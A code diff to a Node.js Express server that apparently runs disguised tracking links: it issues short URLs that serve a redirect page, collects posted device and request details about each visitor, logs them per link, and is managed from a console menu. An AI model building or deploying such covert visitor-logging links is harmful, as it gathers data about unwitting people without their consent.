@@ -1,11 +1,19 @@
 const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
-const port = 7070;
-
-app.use(express.static(__dirname + '/client'));
+const fs = require('fs');
+const readline = require('readline');
+var rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
 app.use(bodyParser.urlencoded({extended: false}));
 app.use(bodyParser.json());
+
+const port = 7070;
+const urlListFile = 'list.json';
+const logFolder = 'logs/';
+
 
 app.listen(port, function(){
     console.log(`listenning on localhost:${port}`);
@@ -48,12 +56,119 @@ function getData(data, req){
     data['CPU'].architecture = res.cpu.architecture || '[unknown]';
 }
 
-app.post('/', function(req, res){
+async function getUrlList(){
+    var text = await new Promise((resolve, reject) => {
+        fs.readFile(urlListFile, 'utf-8', (err, data) => {
+            if(err && err.code != 'ENOENT') throw err;
+            resolve(data);
+        });
+    });
+    return JSON.parse(text || '{}');
+}
+async function saveUrlList(list){
+    var text = await new Promise((resolve, reject) => {
+        //https://stackoverflow.com/questions/12899061/creating-a-file-only-if-it-doesnt-exist-in-node-js
+        fs.writeFile(urlListFile, JSON.stringify(list), { flag: 'w+' }, (err) => {
+            if(err) throw err;
+            resolve();
+        });
+    });
+}
+
+function isYes(input){
+    return input.toLowerCase().startsWith('y');
+}
+
+
+//https://stackoverflow.com/questions/43638105/how-to-get-synchronous-readline-or-simulate-it-using-async-in-nodejs
+const getLine = (function () {
+    const getLineGen = (async function* () {
+        for await (const line of rl) {
+            yield line;
+        }
+    })();
+    return async () => ((await getLineGen.next()).value);
+})();
+
+app.get('/script.js', async function(req, res){
+    res.sendFile(__dirname + '/client/script.js');
+});
+
+app.get('/*', async function(req, res){
+    var urlList = await getUrlList();
+    var url = req.originalUrl.slice(1);
+    if(urlList[url])
+        if(urlList[url].count != 0){
+            fs.readFile(__dirname + '/client/index.html', (err, data) => {
+                if(err) throw err;
+                res.send(data.toString().replace('<<<REDIRECT>>>', JSON.stringify(urlList[url].redirect)));
+                res.end();
+            });
+            console.log('\nRequest to URL: ' + url);
+            urlList[url].count--;
+            await saveUrlList(urlList);
+        }
+});
+
+app.post('/*', async function(req, res){
     var data = req.body;
     getData(data, req);
-    console.log('Logs Received');
-    console.log('--------------------------------------------------');
-    console.log(stringifyObject(data));
-    console.log('');
     res.end('');
+
+    var log = '';
+    log += '--------------------------------------------------\n';
+    log += stringifyObject(data) + '\n\n\n';
+
+    var urlList = await getUrlList();
+    var url = req.originalUrl.slice(1);
+    if(urlList[url])
+        fs.writeFile(logFolder + url + '.log', log, { flag: 'a+' }, (err) => {
+            if(err && err.code != 'ENOENT') throw err;
+        });
 });
+
+app.use(express.static(__dirname + '/client'));
+
+
+(async () => {
+    while(true){
+        var urlList = await getUrlList();
+        console.log('Items:');
+        for(var url of Object.keys(urlList)){
+            var c = urlList[url].count;
+            console.log(`    [${c}]${
+                ' '.repeat(12 - c.toString().length - url.toString().length)
+            } ${url}->${urlList[url].redirect}: ${urlList[url].comment}`);
+        }
+
+        process.stdout.write('Please enter a URL: ');
+        var url = await getLine();
+        if(urlList[url]){
+            process.stdout.write(`Removing URL: ${url}. Are tou sure? `);
+            if(isYes(await getLine())){
+                delete urlList[url];
+                await saveUrlList(urlList);
+                process.stdout.write('Removed URL.\n');
+            }else
+                process.stdout.write('Cancelled removing URL.\n');
+        }else{
+            if(!url){
+                url = '';
+                for(var i = 0; i < 5; i++)
+                    url += Math.floor(Math.random() * 10);
+            }
+            process.stdout.write(`Adding URL: ${url}. Are tou sure? `);
+            urlList[url] = {};
+            if(isYes(await getLine())){
+                process.stdout.write('Enter comment: ');
+                urlList[url].comment = await getLine();
+                process.stdout.write('Enter redirection URL: ');
+                urlList[url].redirect = await getLine();
+                process.stdout.write('Enter maximum redirections: ');
+                urlList[url].count = await getLine();
+                await saveUrlList(urlList);
+            }else
+                process.stdout.write('Cancelled adding URL.\n');
+        }
+    }
+})();
